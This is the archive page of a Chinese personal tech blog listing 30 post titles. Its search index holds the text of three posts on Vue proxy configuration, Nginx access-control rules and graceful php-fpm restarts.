<!DOCTYPE html>
<html>

<head>
  <meta charset="UTF-8" />

<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<meta name="keywords" content="Jw个人博客">
<meta name="description" content="">
<meta name="theme-color" content="#000">
<title>Jw&#39;Blogs</title>
<link rel="shortcut icon" href="/favicon.ico?v=1589001816512">
<link rel="stylesheet" href="/styles/main.css">
<link rel="stylesheet" href="/media/css/gemini.css">

<link rel="stylesheet" href="/media/fonts/font-awesome.css">
<link
  href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Rosario:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext"
  rel="stylesheet" type="text/css">

<link href="/media/hljs/styles/atom-one-dark.css"
  rel="stylesheet">
  


<script src="/media/hljs/highlight.js"></script>
<script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.0/velocity.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.0/velocity.ui.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css"
  integrity="sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq" crossorigin="anonymous">


<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js"
  integrity="sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js"
  integrity="sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI" crossorigin="anonymous"
  onload="renderMathInElement(document.body);"></script>




  <meta name="description" content="">
</head>

<body>
  <div class="head-top-line"></div>
  <div class="header-box">
    
<div class="gemini">
  <header class="header  ">
    <div class="blog-header box-shadow-wrapper bg-color " id="header">
      <div class="nav-toggle" id="nav_toggle">
        <div class="toggle-box">
          <div class="line line-top"></div>
          <div class="line line-center"></div>
          <div class="line line-bottom"></div>
        </div>
      </div>
      <div class="site-meta">       
        <div class="site-title">
          
            <a href="/" class="brand">
              <span>Jw&#39;Blogs</span>
            </a>  
          
        </div>
        
      </div>
      <nav class="site-nav" id="site_nav">
        <ul id="nav_ul">
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/" target="_self">
                  <i class="fa fa-home"></i> 首页
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item nav-item-active">
              
              
                <a href="/archives/" target="_self">
                  <i class="fa fa-archive"></i> 归档
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/tags/" target="_self">
                  <i class="fa fa-tags"></i> 标签
                </a>
              
            </li>
          
          
            
              <li class="nav-item ">
                <a href="/friends/" target="_self">
                  
                    <i class="fa fa-address-book"></i> 友情链接
                  
                </a>
              </li>
            
          
          <li id="fa_search" class="nav-item">
            <a href="javascript:void(0);">
              <i class="fa fa-search"></i> 搜索
            </a>
          </li>
        </ul>
      </nav>
    </div>
  </header>
</div>

<script type="text/javascript"> 
 
  let showNav = true;

  let navToggle = document.querySelector('#nav_toggle'),
  siteNav = document.querySelector('#site_nav');
  
  function navClick() {
    let sideBar = document.querySelector('.sidebar');
    let navUl = document.querySelector('#nav_ul');
    navToggle.classList.toggle('nav-toggle-active');
    siteNav.classList.toggle('nav-menu-active');
    if (siteNav.classList.contains('nav-menu-active')) {
      siteNav.style = "height: " + (navUl.children.length * 42) +"px !important";
    } else {
      siteNav.style = "";
    }
  }

  navToggle.addEventListener('click',navClick);  
</script>
  </div>
  <div class="main-continer">
    
    <div
      class="section-layout  gemini">
      <div class="section-layout-wrapper">
        <div id="sidebarMeta" class="sidebar">
    
<div class="sidebar-wrapper box-shadow-wrapper bg-color">
  <div class="sidebar-item">
    <img class="site-author-image right-motion" src="/images/avatar.png"/>
    <p class="site-author-name">JhonWalker</p>
    
  </div>
  <div class="sidebar-item side-item-stat right-motion">
    <div class="sidebar-item-box">
      <a href="/archives/">
        
        <span class="site-item-stat-count">30</span>
        <span class="site-item-stat-name">文章</span>
      </a>
    </div>
    <div class="sidebar-item-box">
      <a href="">
        <span class="site-item-stat-count">8</span>
        <span class="site-item-stat-name">分类</span>
      </a>
    </div>
    <div class="sidebar-item-box">
      <a href="/tags/">
        <span class="site-item-stat-count">8</span>
        <span class="site-item-stat-name">标签</span>
      </a>
    </div>
  </div>
  
    
  
  


</div>
</div>
<script>
  let sidebarMeta = document.querySelector('#sidebarMeta');
  let scheme = 'gemini';
  let sidebarWrapper = document.querySelector('.sidebar-wrapper');
  if (sidebarMeta && (scheme === 'pisces' || scheme === 'gemini')) {
    document.addEventListener('scroll', function(e) {
      if (document.scrollingElement.scrollTop > parseInt(sidebarMeta.style.marginTop) + 10) {
        sidebarWrapper.classList.add('home-sidebar-fixed')
      } else {
        sidebarWrapper.classList.remove('home-sidebar-fixed')
      }
    });
  }
  </script>
        <div class="section-box box-shadow-wrapper">
          <section class="section archives-section bg-color posts-expand">
            

<div class="bg-color">
  <div class="archive-timeline-box">
    <div class="archive-timeline-title">
      
        <h2>非常好！目前共计30篇日志，继续努力！</h2>
      
    </div>
    
      
      
        <div class="node-title">
          <h2 class="tag-year">2020</h2>
        </div>    
        
      
      <a href="https://jsogn.github.io/post/vue-pei-zhi-kua-yu-dai-li/">
        <div class="motion-warpper tag-archive-node">
          <div class="tag-node">
            <h1>
              05-09
              <small>vue配置跨域代理</small>
            </h1>
          </div>  
      </div>
      </a>
    
      
      
      <a href="https://jsogn.github.io/post/nginx-fang-wen-kong-zhi/">
        <div class="motion-warpper tag-archive-node">
          <div class="tag-node">
            <h1>
              05-09
              <small>Nginx访问控制</small>
            </h1>
          </div>  
      </div>
      </a>
    
      
      
      <a href="https://jsogn.github.io/post/ping-hua-chong-qi-php-fpm/">
        <div class="motion-warpper tag-archive-node">
          <div class="tag-node">
            <h1>
              05-09
              <small>平滑重启php-fpm</small>
            </h1>
          </div>  
      </div>
      </a>
    
      
      
      <a href="https://jsogn.github.io/post/redis-xing-neng-you-hua-zheng-li/">
        <div class="motion-warpper tag-archive-node">
          <div class="tag-node">
            <h1>
              05-09
              <small>Redis性能优化整理</small>
            </h1>
          </div>  
      </div>
      </a>
    
      
      
      <a href="https://jsogn.github.io/post/pac-gui-ze-pei-zhi/">
        <div class="motion-warpper tag-archive-node">
          <div class="tag-node">
            <h1>
              05-09
              <small>PAC规则配置</small>
            </h1>
          </div>  
      </div>
      </a>
    
      
      
      <a href="https://jsogn.github.io/post/she-zhi-centos-fu-wu-qi-ip-di-zhi/">
        <div class="motion-warpper tag-archive-node">
          <div class="tag-node">
            <h1>
              05-09
              <small>设置CentOS服务器IP地址</small>
            </h1>
          </div>  
      </div>
      </a>
    
      
      
      <a href="https://jsogn.github.io/post/a-li-yun-rds-yu-ecs-fu-wu-qi-shu-ju-ku-zuo-zhu-cong/">
        <div class="motion-warpper tag-archive-node">
          <div class="tag-node">
            <h1>
              05-09
              <small>阿里云RDS与ECS服务器数据库做主从</small>
            </h1>
          </div>  
      </div>
      </a>
    
      
      
      <a href="https://jsogn.github.io/post/redis-you-yu-lian-jie-guo-duo-dao-zhi-de-yi-chang/">
        <div class="motion-warpper tag-archive-node">
          <div class="tag-node">
            <h1>
              05-09
              <small>Redis由于连接过多导致的异常</small>
            </h1>
          </div>  
      </div>
      </a>
    
      
      
      <a href="https://jsogn.github.io/post/wang-zhan-fang-wen-ri-zhi-de-ri-chang-cao-zuo/">
        <div class="motion-warpper tag-archive-node">
          <div class="tag-node">
            <h1>
              05-09
              <small>网站访问日志的日常操作</small>
            </h1>
          </div>  
      </div>
      </a>
    
      
      
      <a href="https://jsogn.github.io/post/vue-zhong-axios-de-feng-zhuang/">
        <div class="motion-warpper tag-archive-node">
          <div class="tag-node">
            <h1>
              05-09
              <small>Vue 中 axios 的封装</small>
            </h1>
          </div>  
      </div>
      </a>
    
      
      
      <a href="https://jsogn.github.io/post/nginx-fu-wu-bu-shu-vue-xiang-mu-hou-chu-xian-404-wen-ti/">
        <div class="motion-warpper tag-archive-node">
          <div class="tag-node">
            <h1>
              05-09
              <small>Nginx 服务部署 Vue 项目后,出现 404 问题</small>
            </h1>
          </div>  
      </div>
      </a>
    
      
      
      <a href="https://jsogn.github.io/post/linux-wen-jian-fang-wen-kong-zhi-lie-biao/">
        <div class="motion-warpper tag-archive-node">
          <div class="tag-node">
            <h1>
              05-09
              <small>Linux文件访问控制列表</small>
            </h1>
          </div>  
      </div>
      </a>
    
      
      
      <a href="https://jsogn.github.io/post/linux-wen-jian-de-yin-cang-shu-xing/">
        <div class="motion-warpper tag-archive-node">
          <div class="tag-node">
            <h1>
              05-09
              <small>Linux文件的隐藏属性</small>
            </h1>
          </div>  
      </div>
      </a>
    
      
      
      <a href="https://jsogn.github.io/post/sqlmap-ji-ben-shi-yong/">
        <div class="motion-warpper tag-archive-node">
          <div class="tag-node">
            <h1>
              05-09
              <small>sqlmap基本使用</small>
            </h1>
          </div>  
      </div>
      </a>
    
      
      
      <a href="https://jsogn.github.io/post/phpstudy-hou-men-rec-pi-liang-li-yong-jiao-ben/">
        <div class="motion-warpper tag-archive-node">
          <div class="tag-node">
            <h1>
              05-09
              <small>PHPStudy后门rec批量利用脚本</small>
            </h1>
          </div>  
      </div>
      </a>
    
      
      
      <a href="https://jsogn.github.io/post/nmap-ji-ben-shi-yong/">
        <div class="motion-warpper tag-archive-node">
          <div class="tag-node">
            <h1>
              05-09
              <small>nmap基本使用</small>
            </h1>
          </div>  
      </div>
      </a>
    
      
      
      <a href="https://jsogn.github.io/post/mac-she-zhi-xu-ni-ji-shi-yong-su-zhu-ji-dai-li/">
        <div class="motion-warpper tag-archive-node">
          <div class="tag-node">
            <h1>
              05-09
              <small>Mac设置虚拟机使用宿主机代理</small>
            </h1>
          </div>  
      </div>
      </a>
    
      
      
      <a href="https://jsogn.github.io/post/googlehacking/">
        <div class="motion-warpper tag-archive-node">
          <div class="tag-node">
            <h1>
              05-09
              <small>GoogleHacking</small>
            </h1>
          </div>  
      </div>
      </a>
    
      
      
      <a href="https://jsogn.github.io/post/SSR提供商/">
        <div class="motion-warpper tag-archive-node">
          <div class="tag-node">
            <h1>
              05-09
              <small>SS/SSR提供商</small>
            </h1>
          </div>  
      </div>
      </a>
    
      
      
      <a href="https://jsogn.github.io/post/shell-bian-cheng-ji-chu/">
        <div class="motion-warpper tag-archive-node">
          <div class="tag-node">
            <h1>
              05-09
              <small>shell编程基础</small>
            </h1>
          </div>  
      </div>
      </a>
    
      
      
      <a href="https://jsogn.github.io/post/resetful-api-she-ji-gui-fan/">
        <div class="motion-warpper tag-archive-node">
          <div class="tag-node">
            <h1>
              05-09
              <small>RESETful API 设计规范</small>
            </h1>
          </div>  
      </div>
      </a>
    
      
      
      <a href="https://jsogn.github.io/post/php-zhong-de-cuo-wu-chu-li/">
        <div class="motion-warpper tag-archive-node">
          <div class="tag-node">
            <h1>
              05-09
              <small>PHP中的错误处理</small>
            </h1>
          </div>  
      </div>
      </a>
    
      
      
      <a href="https://jsogn.github.io/post/php-lei-fan-she/">
        <div class="motion-warpper tag-archive-node">
          <div class="tag-node">
            <h1>
              05-09
              <small>PHP类反射</small>
            </h1>
          </div>  
      </div>
      </a>
    
      
      
      <a href="https://jsogn.github.io/post/php-dai-ma-jia-mi-tonyenc/">
        <div class="motion-warpper tag-archive-node">
          <div class="tag-node">
            <h1>
              05-09
              <small>php代码加密-tonyenc</small>
            </h1>
          </div>  
      </div>
      </a>
    
      
      
      <a href="https://jsogn.github.io/post/mac-an-zhuang-php-kuo-zhan-pcntl/">
        <div class="motion-warpper tag-archive-node">
          <div class="tag-node">
            <h1>
              05-09
              <small>Mac 安装 PHP 扩展 pcntl</small>
            </h1>
          </div>  
      </div>
      </a>
    
      
      
      <a href="https://jsogn.github.io/post/crontab-shi-xian-n-miao-ding-shi/">
        <div class="motion-warpper tag-archive-node">
          <div class="tag-node">
            <h1>
              05-09
              <small>crontab实现N秒定时</small>
            </h1>
          </div>  
      </div>
      </a>
    
      
      
      <a href="https://jsogn.github.io/post/qing-song-sheng-cheng-jwt-de-cha-jian/">
        <div class="motion-warpper tag-archive-node">
          <div class="tag-node">
            <h1>
              05-09
              <small>轻松生成jwt的插件</small>
            </h1>
          </div>  
      </div>
      </a>
    
      
      
      <a href="https://jsogn.github.io/post/qiao-yong-php-shu-zu-han-shu/">
        <div class="motion-warpper tag-archive-node">
          <div class="tag-node">
            <h1>
              05-09
              <small>巧用PHP数组函数</small>
            </h1>
          </div>  
      </div>
      </a>
    
      
      
      <a href="https://jsogn.github.io/post/duan-lian-jie/">
        <div class="motion-warpper tag-archive-node">
          <div class="tag-node">
            <h1>
              05-09
              <small>短链接</small>
            </h1>
          </div>  
      </div>
      </a>
    
      
      
      <a href="https://jsogn.github.io/post/0-1-hu-zhuan/">
        <div class="motion-warpper tag-archive-node">
          <div class="tag-node">
            <h1>
              05-09
              <small>0 1 互转</small>
            </h1>
          </div>  
      </div>
      </a>
    
  </div>
  
<div class="page bg-color">
  <ul class="pagination-ul">
    
    
      
        <li class="pagination-li pagination-active">
            <a href="/archives/page/../">
              1
            </a>
        </li>
      
    
    
  </ul>
</div>
</div>

          </section>
        </div>
      </div>
    </div>
    <div class="footer-box">
  <footer class="footer">
    <!-- <div class="copyright">
      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | © 2019-2020 Theme By <a href="https://github.com/hsxyhao/gridea-theme-next" target="_blank">HsxyHao</a>
    </div> -->
    <div class="poweredby">
      
    </div>
  </footer>
  
  
  <div class="gemini back-to-top" id="back_to_top">
    <i class="fa fa-arrow-up"></i>
    
    <span class="scrollpercent">
      <span id="back_to_top_text">0</span>%
    </span>
    
  </div>
  
  
  
</div>
<script>

  let sideBarOpen = 'sidebar-open';
  let body = document.body;
  let back2Top = document.querySelector('#back_to_top'),
  back2TopText = document.querySelector('#back_to_top_text'),
  drawerBox = document.querySelector('#drawer_box'),
  rightSideBar = document.querySelector('.sidebar'),
  viewport = document.querySelector('body');

  function scrollAnimation(currentY, targetY) {
   
    let needScrollTop = targetY - currentY
    let _currentY = currentY
    setTimeout(() => {
      const dist = Math.ceil(needScrollTop / 10)
      _currentY += dist
      window.scrollTo(_currentY, currentY)
      if (needScrollTop > 10 || needScrollTop < -10) {
        scrollAnimation(_currentY, targetY)
      } else {
        window.scrollTo(_currentY, targetY)
      }
    }, 1)
  }

  back2Top.addEventListener("click", function(e) {
    scrollAnimation(document.scrollingElement.scrollTop, 0);
    e.stopPropagation();
    return false;
  });
  
  window.addEventListener('scroll', function(e) {
    let percent = document.scrollingElement.scrollTop / (document.scrollingElement.scrollHeight - document.scrollingElement.clientHeight) * 100;
    if (percent > 1 && !back2Top.classList.contains('back-top-active')) {
      back2Top.classList.add('back-top-active');
    }
    if (percent == 0) {
      back2Top.classList.remove('back-top-active');
    }
    if (back2TopText) {
      back2TopText.textContent = Math.floor(percent);
    }
  });

  
  let hasCacu = false;
  window.onresize = function() {
    if (window.width > 991) {
      calcuHeight();
    } else {
      hasCacu = false;
    }
  }

  function calcuHeight() {
    // 动态调整站点概览高度
    if (!hasCacu && back2Top.classList.contains('pisces') || back2Top.classList.contains('gemini')) {
      let sideBar = document.querySelector('.sidebar');
      let navUl = document.querySelector('#site_nav');
      sideBar.style = 'margin-top:' + (navUl.offsetHeight + navUl.offsetTop + 15) + 'px;';
      hasCacu = true;
    }
  }
  calcuHeight();
  
  let open = false, MOTION_TIME = 300, RIGHT_MOVE_DIS = '320px';

  if (drawerBox) {
    let rightMotions = document.querySelectorAll('.right-motion');
    let right = drawerBox.classList.contains('right');

    let transitionDir = right ? "transition.slideRightIn" : "transition.slideLeftIn";

    let openProp, closeProp;
    if (right) {
      openProp = {
        paddingRight: RIGHT_MOVE_DIS 
      };
      closeProp = {
        paddingRight: '0px'
      };
    } else {
      openProp = {
        paddingLeft: RIGHT_MOVE_DIS 
      };
      closeProp = {
        paddingLeft: '0px'
      };
    }

    drawerBox.onclick = function() {
      open = !open;
      window.Velocity(rightSideBar, 'stop');
      window.Velocity(viewport, 'stop');
      window.Velocity(rightMotions, 'stop');
      if (open) {
        window.Velocity(rightSideBar, {
          width: RIGHT_MOVE_DIS
        }, {
          duration: MOTION_TIME,
          begin: function() {
            window.Velocity(rightMotions, transitionDir,{ });
          }
        })
        window.Velocity(viewport, openProp,{
          duration: MOTION_TIME
        });
      } else {
        window.Velocity(rightSideBar, {
          width: '0px'
        }, {
          duration: MOTION_TIME,
          begin: function() {
            window.Velocity(rightMotions, {
              opacity: 0
            });
          }
        })
        window.Velocity(viewport, closeProp ,{
          duration: MOTION_TIME
        });
      }
      for (let i = 0; i < drawerBox.children.length; i++) {
        drawerBox.children[i].classList.toggle('muse-line');
      }
      drawerBox.classList.toggle(sideBarOpen);
    }
  }

  // 链接跳转
  let newWindow = 'true'
  if (newWindow === 'true') {
    let links = document.querySelectorAll('.post-body a')
    links.forEach(item => {
      if (!item.classList.contains('btn')) {
        item.setAttribute("target","_blank");
      }
    })
  }

  let faSearch = document.querySelector('#fa_search');
  faSearch.addEventListener('click', function() {
    document.querySelector('#search_mask').style = ''
  })

  // 代码高亮
  hljs.initHighlightingOnLoad();

</script>
  </div>
</body>
<input hidden id="copy" />
<script>
  //拿来主义(真香)^_^，Clipboard 实现摘自掘金 https://juejin.im/post/5aefeb6e6fb9a07aa43c20af
  window.Clipboard = (function (window, document, navigator) {
    var textArea,
      copy;

    // 判断是不是ios端
    function isOS() {
      return navigator.userAgent.match(/ipad|iphone/i);
    }
    //创建文本元素
    function createTextArea(text) {
      textArea = document.createElement('textArea');
      textArea.value = text;
      textArea.style.width = 0;
      textArea.style.height = 0;
      textArea.clientHeight = 0;
      textArea.clientWidth = 0;
      document.body.appendChild(textArea);
    }
    //选择内容
    function selectText() {
      var range,
        selection;

      if (isOS()) {
        range = document.createRange();
        range.selectNodeContents(textArea);
        selection = window.getSelection();
        selection.removeAllRanges();
        selection.addRange(range);
        textArea.setSelectionRange(0, 999999);
      } else {
        textArea.select();
      }
    }

    //复制到剪贴板
    function copyToClipboard() {
      try {
        document.execCommand("Copy")
      } catch (err) {
        alert("复制错误！请手动复制！")
      }
      document.body.removeChild(textArea);
    }

    copy = function (text) {
      createTextArea(text);
      selectText();
      copyToClipboard();
    };

    return {
      copy: copy
    };
  })(window, document, navigator);

  function copyCode(e) {
    if (e.srcElement.tagName === 'SPAN' && e.srcElement.classList.contains('copy-code')) {
      let code = e.currentTarget.querySelector('code');
      var text = code.innerText;
      if (e.srcElement.textContent === '复制成功') {
        console.log('复制操作频率过高');
        return;
      }
      e.srcElement.textContent = '复制成功';
      (function (elem) {
        setTimeout(() => {
          if (elem.textContent === '复制成功') {
            elem.textContent = '复制代码'
          }
        }, 1000);
      })(e.srcElement)
      Clipboard.copy(text);
    }
  }

  let pres = document.querySelectorAll('pre');
  pres.forEach(pre => {
    let code = pre.querySelector('code');
    let copyElem = document.createElement('span');
    copyElem.classList.add('copy-code');
    copyElem.textContent = '复制代码';
    pre.appendChild(copyElem);
    pre.onclick = copyCode
  })
</script>
<script src="/media/js/motion.js"></script>

<script src="https://cdn.jsdelivr.net/gh/cferdinandi/smooth-scroll/dist/smooth-scroll.polyfills.min.js"></script>
<script>
  var scroll = new SmoothScroll('a[href*="#"]', {
    speed: 200
  });
</script>

<div class="search-mask" id="search_mask" style="display: none;">
  <div class="search-box">
    <div class="search-title">
      <i class="fa fa-search"></i>
      <div class="input-box">
        <input id="search" type="text" placeholder="搜索">
      </div>
      <i id="close" class="fa fa-times-circle"></i>
    </div>
    <div class="stat-box">
      <span id="stat_count">0</span>条相关条目，使用了<span id="stat_times">0</span>毫秒
      <hr>
    </div>
    <div class="result" id="result">
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://jsogn.github.io/post/vue-pei-zhi-kua-yu-dai-li/"" data-c="
          &lt;h3 id=&#34;前言&#34;&gt;前言&lt;/h3&gt;
&lt;p&gt;如果前端应用和后端 API 服务器没有运行在同一个主机上，需要在开发环境下将 API 请求代理到 API 服务器。这个问题可以通过 vue.config.js 中的 devServer.proxy 选项来配置。&lt;/p&gt;
&lt;!--more--&gt;
&lt;h3 id=&#34;vueconfigjs&#34;&gt;vue.config.js&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;vue.config.js&lt;/code&gt; 是一个可选的配置文件，如果项目的 (和 package.json 同级的) 根目录中存在这个文件，那么它会被 @vue/cli-service 自动加载。你也可以使用 package.json 中的 vue 字段，但是注意这种写法需要你严格遵照 JSON 的格式来写。&lt;/p&gt;
&lt;p&gt;这个文件应该导出一个包含了选项的对象&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// vue.config.js
module.exports = {
  // 选项...
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;devserverproxy&#34;&gt;devServer.proxy&lt;/h3&gt;
&lt;p&gt;devServer.proxy 可以是一个指向开发环境 API 服务器的字符串：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;module.exports = {
  devServer: {
    proxy: &#39;http://localhost:4000&#39;
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这会告诉开发服务器将任何未知请求 (没有匹配到静态文件的请求) 代理到http://localhost:4000。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;module.exports = {
  devServer: {
    proxy: {
      &#39;/api&#39;: {
        target: &#39;&amp;lt;url&amp;gt;&#39;,
        ws: true,
        changeOrigin: true
        pathRewrite: {
            &#39;^/api&#39;: &#39;&#39;
        }
      },
      &#39;/foo&#39;: {
        target: &#39;&amp;lt;other_url&amp;gt;&#39;
      }
    }
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;更多的代理控制行为，也可以使用一个 path: options 成对的对象。完整的选项可以查阅 &lt;a href=&#34;https://github.com/chimurai/http-proxy-middleware#proxycontext-config&#34;&gt;http-proxy-middleware&lt;/a&gt; 。&lt;/p&gt;
&lt;h3 id=&#34;总结&#34;&gt;总结&lt;/h3&gt;
&lt;p&gt;以上均出自官方文档，发现很多人不知道看vue配置文档，百分之八十的问题都可以通过文档解决&lt;/p&gt;
">vue配置跨域代理</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://jsogn.github.io/post/nginx-fang-wen-kong-zhi/"" data-c="
          &lt;h3 id=&#34;前言&#34;&gt;前言&lt;/h3&gt;
&lt;p&gt;有时，网站会被恶意入侵，可用Nginx做一些访问控制，加强一些网站安全性&lt;/p&gt;
&lt;!--more--&gt;
&lt;h3 id=&#34;扩展名限制&#34;&gt;扩展名限制&lt;/h3&gt;
&lt;p&gt;禁止访问指定目录下的程序&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-conf&#34;&gt;location ~ ^/images/.*\.(php|py)$
{
    deny all;
}

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;禁止访问指定文件名程序&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-conf&#34;&gt;location ~ ^/data/(attachment|avatar).*\.(php|py)$
{
    deny all;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;文件或目录限制&#34;&gt;文件或目录限制&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-conf&#34;&gt;location ~ ^/(\.user.ini|\.htaccess|\.git|\.svn|\.project|LICENSE|README.md) {
    return 404;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;排除某个目录不受限制&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-conf&#34;&gt;location ~ \.well-known{
    allow all;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;禁止访问单个目录&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-conf&#34;&gt;location ~ ^/static {
    deny all;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;禁止访问多个目录，并返回指定状态码&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-conf&#34;&gt;location ~ ^/(static|js) {
    return 404;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;限制ip访问&#34;&gt;限制IP访问&lt;/h3&gt;
&lt;p&gt;禁止目录访问，但允许某IP访问&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-conf&#34;&gt;location ~ ^/mysql_loging/ {
    allow 192.168.0.4;
    deny all;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;限制IP或IP段访问&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-conf&#34;&gt;location / {
    deny 192.168.0.4;
    allow 192.168.1.0/16;
    allow 10.0.0.0/24;
    deny all;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;nginx做反向代理的时候也可以限制客户端IP&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-conf&#34;&gt;if ( $remoteaddr = 10.0.0.7 ) {
    return 403;
}

if ( $remoteaddr = 218.247.17.130 ) {
    set $allow_access_root &#39;ture&#39;;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;禁止某ip段访问并向浏览器输出一段文字（若有乱码,请在server中添加：charset utf-8;）&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-conf&#34;&gt;if ($remote_addr ~* ^211\.149\.(.*?)\.(.*?)$){
return 404 &amp;quot;黑名单用户，拒绝访问&amp;quot;;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;禁止非法域名解析访问&#34;&gt;禁止非法域名解析访问&lt;/h3&gt;
&lt;p&gt;让使用IP访问网站的用户，或恶意接卸域名的用户，收到501错误&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-conf&#34;&gt;server {
    listen 80 default_server;
    server_name _;
    return 501;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;通过301跳转主页&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-conf&#34;&gt;server {
    listen 80 default_server;
    server_name _;
    rewrite ^(.*) http://blog.dns.com/$1 permanent;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;发现某域名恶意解析到公司的服务器IP，在server标签里添加以下代码即可，若有多个server要多处添加&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-conf&#34;&gt;if ($host !~ ^www/.tag/.com$) {
    rewrite ^(.*) http://blog.mydns.vip$1 permanent;
}
&lt;/code&gt;&lt;/pre&gt;
">Nginx访问控制</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://jsogn.github.io/post/ping-hua-chong-qi-php-fpm/"" data-c="
          &lt;h3 id=&#34;前言&#34;&gt;前言&lt;/h3&gt;
&lt;p&gt;php-fpm 会对下面几个信号作（自己的）处理&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SIGINT, SIGTERM: immediate termination&lt;/li&gt;
&lt;li&gt;SIGQUIT: graceful stop&lt;/li&gt;
&lt;li&gt;SIGUSR1: re-open log file&lt;/li&gt;
&lt;li&gt;SIGUSR2: graceful reload of all workers + reload of fpm conf/binary&lt;/li&gt;
&lt;/ul&gt;
&lt;!--more--&gt;
&lt;h3 id=&#34;理解&#34;&gt;理解&lt;/h3&gt;
&lt;p&gt;master进程可以理解以下信号&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;INT （2）, TERM（15） 立刻终止&lt;/li&gt;
&lt;li&gt;QUIT （3） 平滑终止&lt;/li&gt;
&lt;li&gt;USR1 重新打开日志文件&lt;/li&gt;
&lt;li&gt;USR2 平滑重载所有worker进程并重新载入配置和二进制模块&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;查看进程数&#34;&gt;查看进程数&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;ps aux | grep -c php-fpm
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;查看master进程号&#34;&gt;查看master进程号&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;ps aux|grep &#39;php-fpm: master&#39; | awk &#39;{print $2}&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;平滑重启&#34;&gt;平滑重启&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;kill -USR2 `cat /usr/local/php/var/run/php-fpm.pid`
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;OR&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;kill -USR2 [pid]
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;脚本实现&#34;&gt;脚本实现&lt;/h3&gt;
&lt;h4 id=&#34;centos脚本实现&#34;&gt;centos脚本实现&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/bash
echo &amp;quot;php-fpm is reloading....&amp;quot;
PID=`ps aux | grep php-fpm | grep &amp;quot;master&amp;quot; |awk &#39;{print $2}&#39;`

[ $PID ] &amp;amp;&amp;amp; kill -USR2 $PID || echo &amp;quot;php-fpm is useing(pid=$PID)&amp;quot;
echo &amp;quot;reload done!&amp;quot;
echo &amp;quot;php-fpm is reload...&amp;quot;
echo &amp;quot;reload done!&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
">平滑重启php-fpm</a>
      </div>
      
      <div class="item">
